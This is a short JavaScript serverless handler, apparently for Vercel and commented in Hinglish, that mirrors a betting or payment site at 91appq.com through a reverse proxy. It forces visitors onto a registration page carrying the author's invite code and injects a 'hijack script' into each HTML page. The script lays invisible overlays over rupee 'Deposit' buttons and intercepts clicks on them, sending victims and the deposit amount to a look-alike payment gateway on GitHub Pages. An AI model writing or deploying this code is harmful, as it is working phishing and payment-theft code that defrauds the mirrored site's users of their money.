export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const targetHost = "https://www.91appq.com";

  // 1. AUTO-REGISTER: Jab koi main link kholga
  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. MIRRORING: Site ka content fetch karo
  const response = await fetch(targetHost + req.url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. HIJACK SCRIPT (Jo tune bheja tha, Vercel compatible banaya)
    const hijackScript = `
    <script>
      (function() {
        const myGitHub = "${myGitHub}";
        
        const attackButton = () => {
          const allElements = document.querySelectorAll('button, .van-button, [role="button"], div');
          
          allElements.forEach(el => {
            const text = el.innerText || "";
            if (text.includes('Deposit') && text.includes('₹')) {
              
              if (!el.dataset.locked) {
                el.style.position = 'relative';
                
                // Double Layer: Ek invisible div button ke upar force karo
                const layer = document.createElement('div');
                layer.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;';
                
                layer.onclick = (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  
                  // Amount capture karna
                  const amtMatch = text.match(/[\\d,.]+/);
                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                  
                  window.location.href = myGitHub + "?amount=" + amount;
                };

                el.appendChild(layer);
                el.dataset.locked = "true";
              }
            }
          });
        };

        setInterval(attackButton, 400);

        // Global Safety: Background click interceptor
        document.addEventListener('click', (e) => {
          const targetText = e.target.innerText || "";
          if (targetText.includes('Deposit') && targetText.includes('₹')) {
            e.preventDefault();
            e.stopImmediatePropagation();
            window.location.href = myGitHub;
          }
        }, true);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  // Assets (Images/JS/CSS) normal bhejo
  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
